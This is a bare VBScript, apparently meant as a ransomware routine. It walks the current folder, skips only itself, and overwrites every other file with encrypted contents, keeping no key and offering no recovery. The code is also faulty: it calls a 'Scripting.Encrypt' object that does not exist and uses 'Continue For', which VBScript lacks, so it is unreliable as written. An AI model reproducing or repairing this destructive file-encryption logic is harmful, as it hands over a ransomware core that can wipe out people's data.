Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objCrypto = CreateObject("Scripting.Encrypt")

' Collect file names in the current directory
For Each objFile In objFSO.GetFolder(".").Files
    ' Skip encryption for the script file itself
    If objFile.Name = WScript.ScriptName Then
        Continue For
    End If
    
    ' Read the file contents
    Set objTextFile = objFSO.OpenTextFile(objFile.Path)
    contents = objTextFile.ReadAll
    objTextFile.Close
    
    ' Encrypt the file contents
    encryptedContents = objCrypto.Encrypt(contents)
    
    ' Write the encrypted contents back to the file
    Set objEncryptedFile = objFSO.CreateTextFile(objFile.Path, True)
    objEncryptedFile.Write encryptedContents
    objEncryptedFile.Close
Next
